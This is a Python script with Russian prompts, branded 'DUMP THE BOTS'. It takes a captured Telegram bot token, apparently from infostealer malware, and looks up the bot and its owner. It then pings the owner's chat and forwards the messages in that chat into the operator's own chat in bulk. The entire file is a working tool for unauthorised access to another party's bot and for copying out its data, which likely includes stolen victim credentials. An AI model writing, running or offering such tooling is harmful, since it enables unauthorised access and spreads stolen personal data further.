# CODED BY K3RNEL-DEV
# \ \-_-\ /

import requests
import json
from colorama import init, Fore, Style
from subprocess import call
from time import sleep

def getBotInfo(token):
    r = requests.get(f'https://api.telegram.org/bot{token}/getMe')
    global info
    info = json.loads(r.text)
    if info["ok"] == False:
        print(Fore.RED + '[✗]You entered the wrong token!')
    else:
        print(Fore.GREEN + f"""
Id Бота:  {info["result"]["id"]}
Имя бота: {info["result"]["first_name"]}
Юзернейм бота: {info["result"]["username"]}
          """)

def getOwnerInfo(token, owner_chat_id):
    r = requests.get(f'https://api.telegram.org/bot{token}/getChat?chat_id={owner_chat_id}')
    info = json.loads(r.text)
    try:
        if info["error_code"] == 400:
            print(Fore.RED + '[✗]You entered the wrong id bot owner')
        elif info["error_code"] == 401:
            print(Fore.RED + '[✗]You entered the wrong bot token!')
    except:
        try:
            name = info["result"]["first_name"]
        except:
            name = Fore.RED + "[✗]No name"
        try:
            username = info["result"]["username"]
        except:
            username = Fore.RED + "[✗]No username"
        try:
            bio = info["result"]["bio"]
        except:
            bio = Fore.RED + "[✗]No bio"

        print(Fore.GREEN + f"""
Id Владельца:  {info["result"]["id"]}
Имя владельца: {name}
Юзернейм владельца: {username}
Описание владельца: {bio}
          """)



def banner():
    call('clear')
    print(Fore.MAGENTA + Style.BRIGHT + """
                        ██████╗  ██████╗ ████████╗ ██╗██╗  ██╗
                        ██╔══██╗██╔═████╗╚══██╔══╝███║╚██╗██╔╝
                        ██████╔╝██║██╔██║   ██║   ╚██║ ╚███╔╝
                        ██╔══██╗████╔╝██║   ██║    ██║ ██╔██╗ 
                        ██████╔╝╚██████╔╝   ██║    ██║██╔╝ ██╗
                        ╚═════╝  ╚═════╝    ╚═╝    ╚═╝╚═╝  ╚═╝
                             [💀]Coded by K3rnel-dev[💀]
                            [🧛]github.com/K3rnel-dev[🧛]
                               [☠︎︎] DUMP THE BOTS [☠︎︎] 
    """)

def main():
    banner()
    print('\033[39m')
    try:
        token = input(Fore.GREEN + '[🧛]Введите токен бота: ')
        ur_chat_id = int(input('💀:Введите ваш чат айди: '))
        owner_chat_id = int(input('💀:Введите чат айди создателя стиллера: '))
    except ValueError:
        print(Fore.RED + '[✗]Invalid input! You must enter integers for chat IDs.')
        exit()

    getBotInfo(token)
    print('\033[39m')
    getOwnerInfo(token, owner_chat_id)
    print('\033[39m')
    input(Fore.MAGENTA + f'[☠︎︎]Теперь напишите что-нибудь боту {info["result"]["username"]}, чтобы получить информацию с дампа.\n[☠︎︎] Enter для продолжения')
    print('\033[39m')
    countOfDesire = checkMessages(token, owner_chat_id, ur_chat_id)
    print('\033[39m')
    redirectMessages(token, owner_chat_id, ur_chat_id, countOfDesire)

def checkMessages(token, owner_chat_id, ur_chat_id):
    global countOfDesire
    r = requests.get(f'https://api.telegram.org/bot{token}/sendMessage?text=Dump test: PASSED✓&chat_id={owner_chat_id}')
    info = json.loads(r.text)
    countOfMessages = info['result']['message_id']
    try:
        countOfDesire = int(input(Fore.GREEN + f'[✓]Количество сообщений бота для дампа: {countOfMessages}\n[✓]Количество сообщений которые дампим: '))
    except ValueError:
        countOfDesire = int(input(Fore.RED + f'\n\n[✗]Нужно вводить целое число.\n[✓]Количество сообщений бота для дампа:: {countOfMessages}\n[✓]Количество сообщений которые дампим: '))
    return countOfDesire

def redirectMessages(token, owner_chat_id, ur_chat_id, countOfDesire):
    call('clear')
    banner()
    for i in range(0, countOfDesire):
        r = requests.get(f'https://api.telegram.org/bot{token}/forwardMessage?chat_id={ur_chat_id}&from_chat_id={owner_chat_id}&message_id={i}')
        info = json.loads(r.text)
        try:
            if info['description'] == 'Bad Request: chat not found':
                print(Fore.RED + '[✗]У вас неправильный айди или вы не запустили бота!')
                exit()
            elif info['description'] == 'Bad Request: message to forward not found':
                print(Fore.RED + '[✗]Не удалось отправить данное сообщение, видимо владелец его удалил')
        except Exception as e:
            # print(e)
            print(Fore.GREEN + '[✓]Сообщение было успешно отправлено!')
    print(Fore.GREEN + '[✓]Дамп окончен | 3 секунды до очистки . . .')
    sleep(3)
    call('clear')
    banner()
    print(Fore.GREEN + f'[🧛]Количество дампнутых сообщений: {countOfDesire}\n')
    input(Fore.GREEN + '[✓]Enter чтобы выйти. . .')

if __name__ == '__main__':
    init()
    main()
